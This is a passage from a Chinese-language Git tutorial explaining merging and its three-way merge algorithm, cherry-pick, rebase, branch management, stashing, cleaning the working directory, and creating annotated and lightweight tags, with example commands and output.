'iss53'\n\nConflicts:\n    index.html\n#\n# It looks like you may be committing a merge.\n# If this is not correct, please remove the file\n#\t.git/MERGE_HEAD\n# and try again.\n\n\n# Please enter the commit message for your changes. Lines starting\n# with '#' will be ignored, and an empty message aborts the commit.\n# On branch master\n# All conflicts fixed but you are still merging.\n#\n# Changes to be committed:\n#\tmodified:   index.html\n#\n```\n如果你觉得上述的信息不够充分，不能完全体现分支合并的过程，你可以修改上述信息， 添加一些细节给未来检视这个合并的读者一些帮助，告诉他们你是如何解决合并冲突的，以及理由是什么。\n\n### fast-forward(快速合并)\n其实指的是源分支和目标分支之间没有分叉（单词 diverge），这种情况下合并**一定**是没有冲突的。且这种情况下合并**一定**是快速合并, 并且快速合并只发生在这种情况下\n如下图中的master分支与feature分支合并是快速合并\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104306.png)\n\n如果是下图中的场景，无法通过 HEAD 的快速移动实现分支的合并！\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104315.png)\n\n### cherry-pick\n对于多分支的代码库，将代码从一个分支转移到另一个分支是常见需求。\n这时分两种情况。一种情况是，你需要另一个分支的所有代码变动，那么就采用合并（git merge）。另一种情况是，你只需要部分代码变动（某几个提交），这时可以采用 Cherry pick。\n#### 基本用法\ngit cherry-pick命令的作用，就是将指定的提交（commit）应用于其他分支。\n```shell\n$ git cherry-pick <commitHash>\n```\n上面命令就会将指定的提交commitHash，应用于当前分支。这会在当前分支产生一个新的提交，当然它们的哈希值会不一样。\n举例来说，代码仓库有master和feature两个分支。\n```\n    a - b - c - d   Master\n         \\\n           e - f - g Feature\n````\n现在将提交f应用到master分支。\n```shell\n# 切换到 master 分支\n$ git checkout master\n\n# Cherry pick 操作\n$ git cherry-pick f\n```\n上面的操作完成以后，代码库就变成了下面的样子。\n```\n    a - b - c - d - f   Master\n         \\\n           e - f - g Feature\n```\n从上面可以看到，master分支的末尾增加了一个提交f。\ngit cherry-pick命令的参数，不一定是提交的哈希值，分支名也是可以的，表示转移该分支的最新提交。\n```shell\n$ git cherry-pick feature\n```\n上面代码表示将feature分支的最近一次提交，转移到当前分支。\n\n#### 转移多个提交\nCherry pick 支持一次转移多个提交。\n```shell\n$ git cherry-pick <HashA> <HashB>\n```\n上面的命令将 A 和 B 两个提交应用到当前分支。这会在当前分支生成两个对应的新提交。\n如果想要转移一系列的连续提交，可以使用下面的简便语法。\n```shell\n$ git cherry-pick A..B \n```\n上面的命令可以转移从 A 到 B 的所有提交。它们必须按照正确的顺序放置：提交 A 必须早于提交 B，否则命令将失败，但不会报错。\n注意，使用上面的命令，提交 A 将不会包含在 Cherry pick 中。如果要包含提交 A，可以使用下面的语法。\n```shell\n$ git cherry-pick A^..B \n```\n\n#### 代码冲突\n如果操作过程中发生代码冲突，Cherry pick 会停下来，让用户决定如何继续操作。\n（1）`--continue`\n用户解决代码冲突后，第一步将修改的文件重新加入暂存区（git add .），第二步使用下面的命令，让 Cherry pick 过程继续执行。\n```shell\n$ git cherry-pick --continue\n```\n（2）`--abort`\n发生代码冲突后，放弃合并，回到操作前的样子。\n（3）`--quit`\n发生代码冲突后，退出 Cherry pick，但是不回到操作前的样子。\n\n### 变基\n在 Git 中整合来自不同分支的修改主要有三种方法：merge 、cherry-pick以及 rebase。 在本节中我们将学习什么是“变基”，怎样使用“变基”，并将展示该操作的惊艳之处，以及指出在何种情况下你应避免使用它。\n\n变基的基本操作\n请回顾之前在 分支的合并 中的一个例子，你会看到开发任务分叉到两个不同分支，又各自提交了更新。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104325.png)\n\n之前介绍过，整合分支最容易的方法是 merge 命令。 它会把两个分支的最新快照（C3 和 C4）以及二者最近的共同祖先（C2）进行三方合并，合并的结果是生成一个新的快照（并提交）。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104335.png)\n\n其实，还有一种方法：你可以提取在 C4 中引入的补丁和修改，然后在 C3 的基础上应用一次。 在 Git 中，这种操作就叫做 变基（rebase）。 你可以使用 rebase 命令将提交到某一分支上的所有修改都移至另一分支上，就好像“重新播放”一样。\n\n在这个例子中，你可以检出 experiment 分支，然后将它变基到 master 分支上：\n```shell\n$ git checkout experiment\n$ git rebase master\nFirst, rewinding head to replay your work on top of it...\nApplying: added staged command\n```\n它的原理是首先找到这两个分支（即当前分支 experiment、变基操作的目标基底分支 master） 的最近共同祖先 C2，然后对比当前分支相对于该祖先的历次提交，提取相应的修改并存为临时文件， 然后将当前分支指向目标基底 C3, 最后以此将之前另存为临时文件的修改依序应用。 （译注：写明了 commit id，以便理解，下同）\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104345.png)\n\n现在回到 master 分支，进行一次快进合并。\n```shell\n$ git checkout master\n$ git merge experiment\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104357.png)\n\n此时，C4' 指向的快照就和 the merge example 中 C5 指向的快照一模一样了。 这两种整合方法的最终结果没有任何区别，但是变基使得提交历史更加整洁。 你在查看一个经过变基的分支的历史记录时会发现，尽管实际的开发工作是并行的， 但它们看上去就像是串行的一样，提交历史是一条直线没有分叉。\n\n一般我们这样做的目的是为了确保在向远程分支推送时能保持提交历史的整洁——例如向某个其他人维护的项目贡献代码时。 在这种情况下，你首先在自己的分支里进行开发，当开发完成时你需要先将你的代码变基到 origin/master 上，然后再向主项目提交修改。 这样的话，该项目的维护者就不再需要进行整合工作，只需要快进合并便可。\n\n\n### 合并原理\ngit merge文件是以行为单位进行一行一行进行合并的，但是有些时候并不是两行内容不一样git就会报冲突，因为git会帮我们自动进行取舍，分析出哪个结果才是我们所期望的，如果git都无法进行取舍的时候才会报冲突，这个时候才需要我们进行人工干预。那git是如何帮我们进行merge操作的呢?\n\n在介绍git merge算法前，先来看一个比较简单的算法：Two-way merge。\n\n#### Two-way merge\nTwo-way merge解决的问题是：如何把两个文件进行合并。\n\n举个例子，假设你和另外一个人同时修改了一个文件，这时merging算法看到了这两个文件，如下图：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104407.png)\n\nmerging算法发现两个文件大部分都一样，只有30行不一样，\n- 在Yours的版本里内容是：Print(\"hello\")\n- 在Mine的版本里内容是：Print(\"bye\")\n但是merging算法怎么知道是你修改了30行还是另外一个人修改了？可能会有以下几种情况：\n- Mine版本没有修改，Yours版本修改了内容（从Print(\"bye\") 修改 Print(\"hello\"))\n- Yours版本没有修改，Mine版本修改了内容（从Print(\"hello\") 修改 Print(\"bye\")）\n- Yours和Mine都修改了内容，（Yours从???修改成Print(\"hello\")；Mine从???修改成Print(\"bye\")\n- Yours和Mine都增加了一行\n对于一个merge算法来说，该怎么处理上述4中情况呢？\n- Mine版本没有修改，Yours版本修改了内容 => 应该选Yours版本\n- Yours版本没有修改，Mine版本修改了内容 => 应该选Mine版本\n- Yours和Mine都修改了内容 => 需要手动解决冲突\n- Yours和Mine都增加了一行 => 需要手动解决冲突\n由于缺乏必要的信息，Two-way merge根本无法帮助我们解决冲突，TA只能帮助我们发现冲突，需要手动解决冲突。\n\n如果让merging算法知道更多一些信息，merging算法是否可以帮助我们自动解决一些简单的冲突呢？下面来看一下Three-way merge算法。\n\n#### Three-way merge\nThree-way merge是在Two-way merge的基础上又增加了一个信息，即两个需要合并的文件修改前的版本。如下图所示，merge算法现在知道三个信息：\n- Mine：需要合并的一个文件\n- Yours：另一个需要合并的文件\n- Base：两个文件修改前的版本\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104422.png)\n\n这时merging算法发现：\n- 修改前的Base版本里的内容是：Print(\"bye\")\n- 在Yours的版本里内容是：Print(\"hello\")\n- 在Mine的版本里内容是：Print(\"bye\")\n说明Yours对这一行做了修改，而Mine对这行没有做修改，因此对Yours和Mine进行merge后的结果应该采用Yours的修改，于是就变成Print(\"hello\")。\n\n这就是Three-way merge的大致原理。\n\n#### Three-way merge的一个复杂案例\n我们来看一个更加复杂的案例，如下图：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104433.png)\n\n按行对比两个文件后，merging算法发现有3个地方不一样，分别是：\n- 30行：上文描述的冲突案例\n- 51行：有一个for循环被同时修改\n- 70行：Mine的版本里面新增了一行\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104446.png)\n\n我们来看一下这三种冲突改怎么解决：\n- 30行：只有Yours修改了，因此使用Yours的版本\n- 51行：Yours和Mine都修改了，需要手工解决冲突\n- 70行：Mine新增了一行，因此使用Mine的版本\n\n#### 实战\n假设我们有2个branch：\n- main：master branch\n- task001：我们正在开发的branch\n我们在task001上开发了一段时间，需要把main上的修改合并到task001，这时可以运行\n```shell\n$ git checkout task001\n$ git merge main\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104459.png)\n\nmerge后结果如下\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104509.png)\n\nmerge的过程其实就是使用Three-way merge，其中\n- Base = commit 1\n- Mine = commit 4\n- Yours = commit 3\nmerge后会生成一个新的merge节点commit 5，并且commit 5会同时依赖commit 3和commit 4。\n\n\n#### Recursive three-way merge\n一般情况下Base会选择Yours和Mine节点的最近的公共祖先。\n但是有的时候最近的公共祖先不是唯一的，例如出现如下图所示的情况：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104519.png)\n\nmerge X'' Y'和X' Y''的时候发现有两个节点都符合最近的公共祖先，即：\n- X' Y\n- X Y'\n我们称这种情况为：Criss-cross-merge，这时就需要用到Recursive three-way merge算法，具体步骤如下：\n1. 先把候选的两个最近的公共祖先递归调用merge，生成成一个虚拟的节点\n2. 然后让这个虚拟节点作为Base\n如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104529.png)\n\n<font color=\"red\">git软件中使用的就是Recursive three-way merge算法。</font>\n\n\n\n\n## 分支管理\n现在已经创建、合并、删除了一些分支，让我们看看一些常用的分支管理工具。\n`git branch`命令不只是可以创建与删除分支。 如果不加任何参数运行它，会得到当前所有分支的一个列表：\n```shell\n$ git branch\n  iss53\n* master\n  testing\n```\n注意`master`分支前的`*`字符：它代表现在检出的那一个分支（也就是说，当前`HEAD`指针所指向的分支）。 这意味着如果在这时候提交，`master`分支将会随着新的工作向前移动。 如果需要查看每一个分支的最后一次提交，可以运行`git branch -v`命令：\n```shell\n$ git branch -v\n  iss53   93b412c fix javascript issue\n* master  7a98805 Merge branch 'iss53'\n  testing 782fd34 add scott to the author list in the readmes\n```\n`--merged`与`--no-merged`这两个有用的选项可以过滤这个列表中已经合并或尚未合并到当前分支的分支。 如果要查看哪些分支已经合并到当前分支，可以运行`git branch --merged`:\n```shell\n$ git branch --merged\n  iss53\n* master\n```\n因为之前已经合并了`iss53`分支，所以现在看到它在列表中。 在这个列表中分支名字前没有`*`号的分支通常可以使用`git branch -d`删除掉；你已经将它们的工作整合到了另一个分支，所以并不会失去任何东西。\n\n查看所有包含未合并工作的分支，可以运行`git branch --no-merged`：\n```shell\n$ git branch --no-merged\n  testing\n```\n这里显示了其他分支。 因为它包含了还未合并的工作，尝试使用`git branch -d`命令删除它时会失败：\n```shell\n$ git branch -d testing\nerror: The branch 'testing' is not fully merged.\nIf you are sure you want to delete it, run 'git branch -D testing'.\n```\n如果真的想要删除分支并丢掉那些工作，如同帮助信息里所指出的，可以使用`-D`选项强制删除它。\n\n> Tip\n上面描述的选项 --merged 和 --no-merged 会在没有给定提交或分支名作为参数时， 分别列出已合并或未合并到 当前 分支的分支。\n你总是可以提供一个附加的参数来查看其它分支的合并状态而不必检出它们。 例如，尚未合并到 master 分支的有哪些？\n```shell\n$ git checkout testing\n$ git branch --no-merged master\n  topicA\n  featureB\n```\n\n## 强制修改分支位置\n我使用相对引用最多的就是移动分支。可以直接使用`-f`选项让分支指向另一个提交。例如:\n```shell\ngit branch -f master HEAD~3\n```\n上面的命令会将 master 分支强制指向 HEAD 的第 3 级父提交。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104538.png)\n\n## 分支开发工作流\n现在你已经学会新建和合并分支，那么你可以或者应该用它来做些什么呢？ 在本节，我们会介绍一些常见的利用分支进行开发的工作流程。而正是由于分支管理的便捷， 才衍生出这些典型的工作模式，你可以根据项目实际情况选择一种用用看。\n\n\n### 长期分支\n因为 Git 使用简单的三方合并，所以就算在一段较长的时间内，反复把一个分支合并入另一个分支，也不是什么难事。 也就是说，在整个项目开发周期的不同阶段，你可以同时拥有多个开放的分支；你可以定期地把某些主题分支合并入其他分支中。\n\n许多使用 Git 的开发者都喜欢使用这种方式来工作，比如只在 master 分支上保留完全稳定的代码——有可能仅仅是已经发布或即将发布的代码。 他们还有一些名为 develop 或者 next 的平行分支，被用来做后续开发或者测试稳定性——这些分支不必保持绝对稳定，但是一旦达到稳定状态，它们就可以被合并入 master 分支了。 这样，在确保这些已完成的主题分支（短期分支，比如之前的 iss53 分支）能够通过所有测试，并且不会引入更多 bug 之后，就可以合并入主干分支中，等待下一次的发布。\n\n事实上我们刚才讨论的，是随着你的提交而不断右移的指针。 稳定分支的指针总是在提交历史中落后一大截，而前沿分支的指针往往比较靠前。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104548.png)\n\n通常把他们想象成流水线（work silos）可能更好理解一点，那些经过测试考验的提交会被遴选到更加稳定的流水线上去。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104601.png)\n\n你可以用这种方法维护不同层次的稳定性。 一些大型项目还有一个 proposed（建议） 或 pu: proposed updates（建议更新）分支，它可能因包含一些不成熟的内容而不能进入 next 或者 master 分支。 这么做的目的是使你的分支具有不同级别的稳定性；当它们具有一定程度的稳定性后，再把它们合并入具有更高级别稳定性的分支中。 再次强调一下，使用多个长期分支的方法并非必要，但是这么做通常很有帮助，尤其是当你在一个非常庞大或者复杂的项目中工作时。\n\n### 主题分支\n主题分支对任何规模的项目都适用。 主题分支是一种短期分支，它被用来实现单一特性或其相关工作。 也许你从来没有在其他的版本控制系统（VCS）上这么做过，因为在那些版本控制系统中创建和合并分支通常很费劲。 然而，在 Git 中一天之内多次创建、使用、合并、删除分支都很常见。\n\n你已经在上一节中你创建的 iss53 和 hotfix 主题分支中看到过这种用法。 你在上一节用到的主题分支（iss53 和 hotfix 分支）中提交了一些更新，并且在它们合并入主干分支之后，你又删除了它们。 这项技术能使你快速并且完整地进行上下文切换（context-switch）——因为你的工作被分散到不同的流水线中，在不同的流水线中每个分支都仅与其目标特性相关，因此，在做代码审查之类的工作的时候就能更加容易地看出你做了哪些改动。 你可以把做出的改动在主题分支中保留几分钟、几天甚至几个月，等它们成熟之后再合并，而不用在乎它们建立的顺序或工作进度。\n\n考虑这样一个例子，你在 master 分支上工作到 C1，这时为了解决一个问题而新建 iss91 分支，在 iss91 分支上工作到 C4，然而对于那个问题你又有了新的想法，于是你再新建一个 iss91v2 分支试图用另一种方法解决那个问题，接着你回到 master 分支工作了一会儿，你又冒出了一个不太确定的想法，你便在 C10 的时候新建一个 dumbidea 分支，并在上面做些实验。 你的提交历史看起来像下面这个样子：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104611.png)\n\n现在，我们假设两件事情：你决定使用第二个方案来解决那个问题，即使用在 iss91v2 分支中方案。 另外，你将 dumbidea 分支拿给你的同事看过之后，结果发现这是个惊人之举。 这时你可以抛弃 iss91 分支（即丢弃 C5 和 C6 提交），然后把另外两个分支合并入主干分支。 最终你的提交历史看起来像下面这个样子：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409104620.png)\n\n我们将会在 分布式 Git 中向你揭示更多有关分支工作流的细节， 因此，请确保你阅读完那个章节之后，再来决定你的下个项目要使用什么样的分支策略（branching scheme）。\n请牢记，当你做这么多操作的时候，这些分支全部都存于本地。 当你新建和合并分支的时候，所有这一切都只发生在你本地的 Git 版本库中 —— 没有与服务器发生交互。\n\n## 贮藏与清理\n有时，当你在项目的一部分上已经工作一段时间后，所有东西都进入了混乱的状态， 而这时你想要切换到另一个分支做一点别的事情。 问题是，你不想仅仅因为过会儿回到这一点而为做了一半的工作创建一次提交。 针对这个问题的答案是`git stash`命令。\n\n贮藏（stash）会处理工作目录的脏的状态——即跟踪文件的修改与暂存的改动——然后将未完成的修改保存到一个栈上， 而你可以在任何时候重新应用这些改动（甚至在不同的分支上）。\n\n>Note\n迁移到`git stash push`\n截至 2017 年 10 月下旬，Git 邮件列表上进行了广泛讨论，该讨论中弃用了`git stash save`命令， 代之以现有`git stash push`命令。主因是`git stash push`引入了贮藏选定的`路径规范`的选项， 而有些东西`git stash save`不支持。\n`git stash save`不会很快就消失，所以不用担心它突然不见。 不过你可能想要迁移到`push`来获取新功能。\n\n### 贮藏工作\n为了演示贮藏，你需要进入项目并改动几个文件，然后可以暂存其中的一个改动。 如果运行`git status` ，可以看到有改动的状态：\n```shell\n$ git status\nChanges to be committed:\n  (use \"git reset HEAD <file>...\" to unstage)\n\n\tmodified:   index.html\n\nChanges not staged for commit:\n  (use \"git add <file>...\" to update what will be committed)\n  (use \"git checkout -- <file>...\" to discard changes in working directory)\n\n\tmodified:   lib/simplegit.rb\n```\n**现在想要切换分支，但是还不想要提交之前的工作, 而当你没有提交变动时,git是不会让你切换分支的，会报错**。此时你就可以贮藏修改。 将新的贮藏推送到栈上，运行`git stash`或`git stash push`：\n```shell\n$ git stash\nSaved working directory and index state \\\n  \"WIP on master: 049d078 added the index file\"\nHEAD is now at 049d078 added the index file\n(To restore them type \"git stash apply\")\n```\n可以看到工作目录是干净的了：\n```shell\n$ git status\n# On branch master\nnothing to commit, working directory clean\n```\n此时，你可以切换分支并在其他地方工作；你的修改被存储在栈上。 要查看贮藏的东西，可以使用`git stash list`：\n```shell\n$ git stash list\nstash@{0}: WIP on master: 049d078 added the index file\nstash@{1}: WIP on master: c264051 Revert \"added file_size\"\nstash@{2}: WIP on master: 21d80a5 added number to log\n```\n在本例中，有两个之前的贮藏，所以你接触到了三个不同的贮藏工作。 可以通过原来 stash 命令的帮助提示中的命令将你刚刚贮藏的工作重新应用：`git stash apply`。 如果想要应用其中一个更旧的贮藏，可以通过名字指定它，像这样：`git stash apply stash@{2}`。 如果不指定一个贮藏，Git 认为指定的是最近的贮藏：\n```shell\n$ git stash apply\nOn branch master\nChanges not staged for commit:\n  (use \"git add <file>...\" to update what will be committed)\n  (use \"git checkout -- <file>...\" to discard changes in working directory)\n\n\tmodified:   index.html\n\tmodified:   lib/simplegit.rb\n\nno changes added to commit (use \"git add\" and/or \"git commit -a\")\n```\n可以看到 Git 重新修改了当你保存贮藏时撤消的文件。 在本例中，当尝试应用贮藏时有一个干净的工作目录，并且尝试将它应用在保存它时所在的分支。 并不是必须要有一个干净的工作目录，或者要应用到同一分支才能成功应用贮藏。 可以在一个分支上保存一个贮藏，切换到另一个分支，然后尝试重新应用这些修改。 当应用贮藏时工作目录中也可以有修改与未提交的文件——如果有任何东西不能干净地应用，Git 会产生合并冲突。\n\n文件的改动被重新应用了，但是之前暂存的文件却没有重新暂存。 想要那样的话，必须使用`--index`选项来运行`git stash apply`命令，来尝试重新应用暂存的修改。 如果已经那样做了，那么你将回到原来的位置：\n```shell\n$ git stash apply --index\nOn branch master\nChanges to be committed:\n  (use \"git reset HEAD <file>...\" to unstage)\n\n\tmodified:   index.html\n\nChanges not staged for commit:\n  (use \"git add <file>...\" to update what will be committed)\n  (use \"git checkout -- <file>...\" to discard changes in working directory)\n\n\tmodified:   lib/simplegit.rb\n```\n应用选项只会尝试应用贮藏的工作——在堆栈上还有它。 可以运行`git stash drop`加上将要移除的贮藏的名字来移除它：\n```shell\n$ git stash list\nstash@{0}: WIP on master: 049d078 added the index file\nstash@{1}: WIP on master: c264051 Revert \"added file_size\"\nstash@{2}: WIP on master: 21d80a5 added number to log\n$ git stash drop stash@{0}\nDropped stash@{0} (364e91f3f268f0900bc3ee613f9f733e82aaed43)\n```\n也可以运行`git stash pop`来应用贮藏然后立即从栈上扔掉它。\n\n### 贮藏的创意性使用\n有几个贮藏的变种可能也很有用。 第一个非常流行的选项是`git stash`命令的`--keep-index`选项。 它告诉 Git 不仅要贮藏所有已暂存的内容，同时还要将它们保留在索引中。\n```shell\n$ git status -s\nM  index.html\n M lib/simplegit.rb\n\n$ git stash --keep-index\nSaved working directory and index state WIP on master: 1b65b17 added the index file\nHEAD is now at 1b65b17 added the index file\n\n$ git status -s\nM  index.html\n```\n另一个经常使用贮藏来做的事情是像贮藏跟踪文件一样贮藏未跟踪文件。 默认情况下，`git stash`只会贮藏已修改和暂存的`已跟踪`文件。 如果指定`--include-untracked `或`-u`选项，Git 也会贮藏任何未跟踪文件。 然而，在贮藏中包含未跟踪的文件仍然不会包含明确 忽略 的文件。 要额外包含忽略的文件，请使用`--all`或`-a`选项。\n```shell\n$ git status -s\nM  index.html\n M lib/simplegit.rb\n?? new-file.txt\n\n$ git stash -u\nSaved working directory and index state WIP on master: 1b65b17 added the index file\nHEAD is now at 1b65b17 added the index file\n\n$ git status -s\n$\n```\n最终，如果指定了`--patch`标记，Git 不会贮藏所有修改过的任何东西， 但是会交互式地提示哪些改动想要贮藏、哪些改动需要保存在工作目录中。\n```shell\n$ git stash --patch\ndiff --git a/lib/simplegit.rb b/lib/simplegit.rb\nindex 66d332e..8bb5674 100644\n--- a/lib/simplegit.rb\n+++ b/lib/simplegit.rb\n@@ -16,6 +16,10 @@ class SimpleGit\n         return `#{git_cmd} 2>&1`.chomp\n       end\n     end\n+\n+    def show(treeish = 'master')\n+      command(\"git show #{treeish}\")\n+    end\n\n end\n test\nStash this hunk [y,n,q,a,d,/,e,?]? y\n\nSaved working directory and index state WIP on master: 1b65b17 added the index file\n```\n从贮藏创建一个分支\n如果贮藏了一些工作，将它留在那儿了一会儿，然后继续在贮藏的分支上工作，在重新应用工作时可能会有问题。 如果应用尝试修改刚刚修改的文件，你会得到一个合并冲突并不得不解决它。 如果想要一个轻松的方式来再次测试贮藏的改动，可以运行`git stash branch <new branchname>`以你指定的分支名创建一个新分支，检出贮藏工作时所在的提交，重新在那应用工作，然后在应用成功后丢弃贮藏：\n```shell\n$ git stash branch testchanges\nM\tindex.html\nM\tlib/simplegit.rb\nSwitched to a new branch 'testchanges'\nOn branch testchanges\nChanges to be committed:\n  (use \"git reset HEAD <file>...\" to unstage)\n\n\tmodified:   index.html\n\nChanges not staged for commit:\n  (use \"git add <file>...\" to update what will be committed)\n  (use \"git checkout -- <file>...\" to discard changes in working directory)\n\n\tmodified:   lib/simplegit.rb\n\nDropped refs/stash@{0} (29d385a81d163dfd45a452a2ce816487a6b8b014)\n```\n这是在新分支轻松恢复贮藏工作并继续工作的一个很不错的途径。\n\n### 清理工作目录\n对于工作目录中一些工作或文件，你想做的也许不是贮藏而是移除。 git clean 命令就是用来干这个的。\n\n清理工作目录有一些常见的原因，比如说为了移除由合并或外部工具生成的东西， 或是为了运行一个干净的构建而移除之前构建的残留。\n\n你需要谨慎地使用这个命令，因为它被设计为从工作目录中移除未被追踪的文件。 如果你改变主意了，你也不一定能找回来那些文件的内容。 一个更安全的选项是运`git stash --all`来移除每一样东西并存放在栈中。\n\n你可以使用`git clean`命令去除冗余文件或者清理工作目录。 使用`git clean -f -d`命令来移除工作目录中所有未追踪的文件以及空的子目录。`-f`意味着“强制（force）”或“确定要移除”，使用它需要 Git 配置变量`clean.requireForce`没有显式设置为`false`。\n\n如果只是想要看看它会做什么，可以使用`--dry-run`或`-n`选项来运行命令， 这意味着“做一次演习然后告诉你 将要 移除什么”。\n```shell\n$ git clean -d -n\nWould remove test.o\nWould remove tmp/\n```\n默认情况下，`git clean`命令只会移除没有忽略的未跟踪文件。 任何与`.gitignore`或其他忽略文件中的模式匹配的文件都不会被移除。 如果你也想要移除那些文件，例如为了做一次完全干净的构建而移除所有由构建生成的`.o`文件， 可以给`clean`命令增加一个`-x`选项。\n```shell\n$ git status -s\n M lib/simplegit.rb\n?? build.TMP\n?? tmp/\n\n$ git clean -n -d\nWould remove build.TMP\nWould remove tmp/\n\n$ git clean -n -d -x\nWould remove build.TMP\nWould remove test.o\nWould remove tmp/\n```\n如果不知道`git clean`命令将会做什么，在将`-n`改为`-f`来真正做之前总是先用`-n`来运行它做双重检查。 另一个小心处理过程的方式是使用`-i`或`“interactive”`标记来运行它。\n\n这将会以交互模式运行`clean`命令。\n```shell\n$ git clean -x -i\nWould remove the following items:\n  build.TMP  test.o\n*** Commands ***\n    1: clean                2: filter by pattern    3: select by numbers    4: ask each             5: quit\n    6: help\nWhat now>\n```\n这种方式下可以分别地检查每一个文件或者交互地指定删除的模式。\n\n>Note\n在一种奇怪的情况下，可能需要格外用力才能让 Git 清理你的工作目录。 如果你恰好在工作目录中复制或克隆了其他 Git 仓库（可能是子模块），那么即便是`git clean -fd `都会拒绝删除这些目录。这种情况下，你需要加上第二个 -f 选项来强调。\n\n# 打标签\n像其他版本控制系统（VCS）一样，Git 可以给仓库历史中的某一个提交打上标签，以示重要。 比较有代表性的是人们会使用这个功能来标记发布结点（ v1.0 、 v2.0 等等）。 在本节中，你将会学习如何列出已有的标签、如何创建和删除新的标签、以及不同类型的标签分别是什么。\n\n## 列出标签\n在 Git 中列出已有的标签非常简单，只需要输入`git tag`（可带上可选的`-l`选项`--list`）：\n```shell\n$ git tag\nv1.0\nv2.0\n```\n这个命令以字母顺序列出标签，但是它们显示的顺序并不重要。\n\n你也可以按照特定的模式查找标签。 例如，Git 自身的源代码仓库包含标签的数量超过 500 个。 如果只对 1.8.5 系列感兴趣，可以运行：\n```shell\n$ git tag -l \"v1.8.5*\"\nv1.8.5\nv1.8.5-rc0\nv1.8.5-rc1\nv1.8.5-rc2\nv1.8.5-rc3\nv1.8.5.1\nv1.8.5.2\nv1.8.5.3\nv1.8.5.4\nv1.8.5.5\n```\n\n>Note\n按照通配符列出标签需要`-l`或`--list`选项\n如果你只想要完整的标签列表，那么运行`git tag`就会默认假定你想要一个列表，它会直接给你列出来， 此时的`-l`或`--list`是可选的。\n然而，如果你提供了一个匹配标签名的通配模式，那么`-l`或`--list`就是强制使用的。\n\n## 创建标签\nGit 支持两种标签：轻量标签（lightweight）与附注标签（annotated）。\n- 轻量标签很像一个不会改变的分支——它只是某个特定提交的引用。\n- 而附注标签是存储在 Git 数据库中的一个完整对象， 它们是可以被校验的，其中包含打标签者的名字、电子邮件地址、日期时间， 此外还有一个标签信息，并且可以使用 GNU Privacy Guard （GPG）签名并验证。 通常会建议创建附注标签，这样你可以拥有以上所有信息。但是如果你只是想用一个临时的标签， 或者因为某些原因不想要保存这些信息，那么也可以用轻量标签。\n\n### 附注标签\n在 Git 中创建附注标签十分简单。 最简单的方式是当你在运行 tag 命令时指定`-a`选项：\n```shell\n$ git tag -a v1.4 -m \"my version 1.4\"\n$ git tag\nv0.1\nv1.3\nv1.4\n```\n`-m`选项指定了一条将会存储在标签中的信息。 如果没有为附注标签指定一条信息，Git 会启动编辑器要求你输入信息。\n\n通过使用`git show`命令可以看到标签信息和与之对应的提交信息：\n```shell\n$ git show v1.4\ntag v1.4\nTagger: Ben Straub <ben@straub.cc>\nDate:   Sat May 3 20:19:12 2014 -0700\n\nmy version 1.4\n\ncommit ca82a6dff817ec66f44342007202690a93763949\nAuthor: Scott Chacon <schacon@gee-mail.com>\nDate:   Mon Mar 17 21:52:11 2008 -0700\n\n    changed the version number\n```\n输出显示了打标签者的信息、打标签的日期时间、附注信息，然后显示具体的提交信息。\n\n### 轻量标签\n另一种给提交打标签的方式是使用轻量标签。 轻量标签本质上是将提交校验和存储到一个文件中——没有保存任何其他信息。 创建轻量标签，不需要使用`-a`、`-s`或`-m`选项，只需要提供标签名字：\n```shell\n$ git tag v1.4-lw\n$ git tag\nv0.1\nv1.3\nv1.4\nv1.4-lw\nv1.5\n```\n这时，如果在标签上运行`git show`，你不会看到额外的标签信息。 命令只会显示出提交信息：\n```shell\n$ git show v1.4-lw\ncommit ca82a6dff817ec66f44342007202690a93763949\nAuthor: Scott Chacon <schacon@gee-mail.com>\nDate:   Mon Mar 17 21:52:11 2008 -0700\n\n    changed the version number\n```\n\n### 后期打标签\n你也可以对过去的提交打标签。 假设提交历史是这样的：\n```shell\n$ git log --pretty=oneline\n15027957951b64cf874c3557a0f3547bd83b3ff6 Merge branch 'experiment'\na6b4c97498bd301d84096da251c98a07c7723e65 beginning write support\n0d52aaab4479697da7686c15f77a3d64d9165190 one more thing\n6d52a271eda8725415634dd79daabbc4d9b6008e Merge branch 'experiment'\n0b7434d86859cc7b8c3d5e1dddfed66ff742fcbc added a commit function\n4682c3261057305bdd616e23b64b0857d832627b added a todo file\n166ae0c4d3f420721acbb115cc33848dfcc2121a started write support\n9fceb02d0ae598e95dc970b74767f19372d61af8 updated rakefile\n964f16d36dfccde844893cac5b347e7b3d44abbc commit the todo\n8a5cbc430f1a9c3d00faaeffd07798508422908a updated readme\n```\n现在，假设在 v1.2 时你忘记给项目打标签，也就是在 “updated rakefile” 提交。 你可以在之后补上标签。 要在那个提交上打标签，你需要在命令的末尾指定提交的校验和（或部分校验和）：\n```shell\n$ git tag -a v1.2 9fceb02\n```\n可以看到你已经在那次提交上打上标签了：\n```shell\n$ git tag\nv0.1\nv1.2\nv1.3\nv1.4\nv1.4-lw\nv1.5\n\n$ git show v1.2\ntag v1.2\nTagger: Scott Chacon <schacon@gee-mail.com>\nDate:   Mon Feb 9 15:32:16 2009 -0800\n\nversion 1.2\ncommit 9fceb02d0ae598e95dc970b74767f19372d61af8\nAuthor: Magnus Chacon <mchacon@gee-mail.com>\nDate:   Sun Apr 27 20:43:35 2008 -0700\n\n    updated rakefile\n...\n```\n\n## 共享标签\n默认情况下，`git push`命令并不会传送标签到远程仓库服务器上。 在创建完标签后你必须显式地推送标签到共享服务器上。 